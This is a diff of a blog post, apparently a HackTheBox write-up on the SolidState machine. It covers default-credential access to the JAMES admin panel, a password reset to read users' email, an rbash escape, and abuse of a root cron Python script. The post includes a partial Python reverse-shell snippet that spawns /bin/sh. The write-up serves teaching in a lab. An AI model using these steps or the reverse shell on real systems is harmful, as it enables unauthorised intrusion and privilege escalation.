@@ -10,16 +10,12 @@ image:
   credit: 
   creditlink: 
 ---
-
-
-This post will describe exploitation of the Solidstate device on [HackTheBox](https://www.hackthebox.eu).
+This post will describe exploitation of the SolidState device on [HackTheBox](https://www.hackthebox.eu).
 
 ![](https://image.ibb.co/nHoHJb/1.png)
 
-Solidstate's an interesting box, and also memorable as the day when the HTB platform shit itself from the load.  It's also a lesson in reading the damn exploit code.  I spent a long time re-running the exploit expecting stuff to happen, but the true realisation came when I sat down and actually read what the exploit did.
+## Enumeration
 
-Enumeration
------------------
 As is tradition, we run a full nmap scan:
 
 ```bash
@@ -38,15 +34,13 @@ PORT     STATE SERVICE     VERSION
 4555/tcp open  james-admin JAMES Remote Admin 2.3.2
 ```
 
-So one service definitely looks interesting, James 2.3.2.  However, we have no idea what we're dealing with so lets do some research and do a quick search for any open vulnerabilities.  From this we find that 
+So one service definitely looks interesting, James 2.3.2. Typically, I would start my investigation on port 80 but based on my knowledge of the James Remote Admin tool. This service is typically left with default credentials which then can be used to change the passwords of the mail server users. From there we can access POP3 and snoop around the emails for the users.  
 
-One CVE that jumps out is an [exploit-db](https://www.exploit-db.com/exploits/35513/) python script.  This lets us inject a payload into bash_completion that will then execute only upon a user's login.  Effectively, we can run an arbitrary command, but only when a user logs in.  
-
-However, this service has authentication.  A quick login confirms that credentials have been left as default:
+Logging in with Default Credentials: 
 
 ![](https://image.ibb.co/h9w4yb/2.png)
 
-From this admin panel, we can change any user's password.
+From this admin panel, we can change any user's password:
 
 ![](https://image.ibb.co/bu1hjG/3.png)
 
@@ -94,16 +88,14 @@ pass: P@55W0rd1!2@
 
 Respectfully,
 James
-``` 
+```
 
-We have recovered a username and password for Mindy, so let's SSH to the machine!
+We have recovered a username and password for Mindy, so let's SSH to the machine. Sounds easy enough. 
 
-I think a few people actually got a shell utilising the above JAMES exploit when the device was first released.  Once someone found the credentials and logged in, someone else's payload would be executed, such as one launching a reverse shell.  This won't work now however, several months after release when most people have done the box, but it gave an initial easy and interesting access point.
-
-Privilege Escalation
-----------------------------
+## Privilege Escalation
 
 ### Rbash escape
+
 When we SSH to the device, we're greeted by a restricted shell.
 
 ![](https://image.ibb.co/cpZ2jG/4.png)
@@ -142,11 +134,12 @@ with open('/root/root.txt', 'rb') as rootfile:
         openthis.write(rootfile.read())
 ```
 
-After a short amount of time, the flag is indeed written to the /var/tmp directory.  
+After a short amount of time, the flag is indeed written to the /var/tmp directory.
 
 Getting a shell from this is then as simple as setting the python file to run any number of [reverse shells](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
 
 We'll place the following in tmp.py:
+
 ```python
 import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -160,4 +153,3 @@ p=subprocess.call(["/bin/sh","-i"])
 Wait a few minutes and:
 
 ![](https://image.ibb.co/iBjPyb/7.png)
-
